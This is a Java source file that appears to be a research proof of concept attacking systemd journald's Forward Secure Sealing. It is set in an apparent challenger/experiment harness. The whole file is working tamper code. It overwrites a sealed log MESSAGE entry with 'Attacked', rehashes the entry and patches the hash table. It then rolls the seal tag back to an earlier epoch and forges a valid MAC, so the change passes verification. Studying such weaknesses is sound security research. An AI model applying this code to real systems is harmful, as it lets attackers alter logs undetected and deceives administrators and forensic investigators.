package journald;

import java.io.IOException;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.text.ParseException;

import com.google.common.hash.HashCode;
import com.google.common.hash.HashFunction;
import com.google.common.hash.Hashing;

import journald.Challenger.LogAdapter;
import journald.Journal.Header;
import journald.JournalObject.DataObject;
import journald.JournalObject.EntryObject;
import journald.JournalObject.TagObject;

public class Attacker implements Challenger.Attacker {

	public static void main(String[] args) throws IOException, ParseException, InterruptedException {
		// new Challenger(new Attacker(), Paths.get("system.journal"), Paths.get("fss"),
		// "bf10b7-475683-760414-8cbe5e/1c3fa1-35a4e900").experiment();
		Challenger c = new Challenger(new Attacker());
		c.experiment();
	}

	public void tamperWithLogfile(JournalFileBuffer mapped, FSPRNGKey key) {
		Header h = Header.readHeader(mapped);
		System.out.println("IncompatibleFlags: " + Integer.toHexString(h.incompatibleFlags));
		JournalMacChecker jmc = new JournalMacChecker(mapped, key, h) {
			@Override
			public void check(long targetPos, long epoch, byte[] hash) {
				if (epoch < key.getMinEpoch()) {
					getNextMac(targetPos, epoch, new BigInteger("1"));
				} else {
					super.check(targetPos, epoch, hash);
				}
			}
		};
		long lastReal = 0;
		long firstReal = 0;
		long lastMacStart = 0;
		TagObject lastMac = null;
		EntryObject lastUsableSealedEntry = null;
		EntryObject lastUsableEntry = null;
		for (int i = 0; i < h.nObjects; i++) {
			long lastMacedUntil = jmc.getMacedUntil();
			JournalObject obj = JournalObject.read(mapped, jmc);
			if (obj instanceof EntryObject) {
				long real = ((EntryObject) obj).real;
				if (real < lastReal) {
					throw new Error();
				}
				lastReal = real;
				if (firstReal == 0) {
					firstReal = real;
				}
				for (DataObject val : (EntryObject) obj) {
					if (val.toString().startsWith("MESSAGE=") && val.getNEntries() == 1) {
						if (val.bb.getOffsetFrom(mapped) >= lastMacedUntil) {
							lastUsableEntry = (EntryObject) obj;
						}
					}
				}
			}
			if (obj instanceof TagObject) {
				System.out.println("Tag@" + obj.bb.getOffsetFrom(mapped));
				if (lastUsableEntry != null) {
					lastMac = (TagObject) obj;
					lastMacStart = lastMacedUntil;
					lastUsableSealedEntry = lastUsableEntry;
					lastUsableEntry = null;
				}
				if (firstReal != 0) {
					try {
						key.validateEpoch(firstReal, lastReal, ((TagObject) obj).epoch);
					} catch (Error e) {
						e.printStackTrace();
					}
				}
				firstReal = 0;
			}
		}
		modifyEntry(mapped, key, h, jmc, lastMacStart, lastMac, lastUsableSealedEntry);
	}

	private static void modifyEntry(JournalFileBuffer mapped, FSPRNGKey key, Header h, JournalMacChecker jmc,
			long lastMacStart, TagObject lastMac, EntryObject lastUsableSealedEntry) throws Error {
		HashFunction sipHash24 = Hashing.sipHash24(h.fileid.l1, h.fileid.l2);

		DataObject targetData = null;
		for (DataObject lastSealedData : lastUsableSealedEntry) {

			if (lastSealedData.toString().startsWith("MESSAGE=")) {
				targetData = lastSealedData;
				break;
			}
		}

		JournalFileBuffer dht = h.sliceDataMap(mapped);
		int hashSize = dht.remaining() / 16;

		HashCode hash = sipHash24.hashBytes(targetData.getData());
		if (targetData.getHash() != hash.asLong()) {
			throw new Error();
		}
		long dataOffset = targetData.bb.getOffsetFrom(mapped);
		if (dataOffset >= lastMacStart && targetData.getNextHashOff() == 0) {
			System.out.println("Yay! Data is at " + dataOffset);
		}

		{
			int slot = (int) targetData.reduceHash(hashSize);
			long head = dht.getLong(16 * slot), tail = dht.getLong(16 * slot + 8);
			if (head != dataOffset - 16 || tail != dataOffset - 16) {
				throw new Error("Hash collision chain not implemented");
			}
			dht.putLong(16 * slot, 0);
			dht.putLong(16 * slot + 8, 0);
		}

		byte[] attacked = "Attacked".getBytes(StandardCharsets.UTF_8);
		System.arraycopy(attacked, 0, targetData.getData(), 11, attacked.length);
		targetData.rehash(sipHash24);
		targetData.writeBack();
		System.out.println(targetData);
		JournalFileBuffer entryBody = lastUsableSealedEntry.getBodyBytebuffer();
		while (entryBody.hasRemaining()) {
			long off = entryBody.getLong();
			if (off == targetData.bb.getOffsetFrom(mapped) - 16) {
				System.out.println("Patching...");
				entryBody.putLong(targetData.getHash());
				// break;
			} else {
				entryBody.getLong();
			}
		}
		int slot = (int) targetData.reduceHash(hashSize);
		long head = dht.getLong(16 * slot), tail = dht.getLong(16 * slot + 8);
		if (head != 0 || tail != 0) {
			throw new Error("Hash collision chain not implemented");
		}
		dht.putLong(16 * slot, targetData.bb.getOffsetFrom(mapped) - 16);
		dht.putLong(16 * slot + 8, targetData.bb.getOffsetFrom(mapped) - 16);

		jmc.setMacedUntil(lastMacStart);
		long targetEpoch = key.getMinEpoch();
		lastMac.setEpoch(targetEpoch);
		lastMac.writeBack();
		byte[] patchedMac = jmc.getNextMac(lastMac.getMacRangeEnd(mapped), targetEpoch);
		lastMac.setMac(patchedMac);
		lastMac.writeBack();

		// just as a sanity check
		jmc.setMacedUntil(lastMacStart);
		jmc.check(lastMac.getMacRangeEnd(mapped), lastMac.getEpoch(), lastMac.getMac());
	}

	@Override
	public void interactWithLog(LogAdapter l) {
		l.log("hello");
		l.advanceEpoch();
		l.log("hello2");
		l.advanceEpoch();		
	}

}
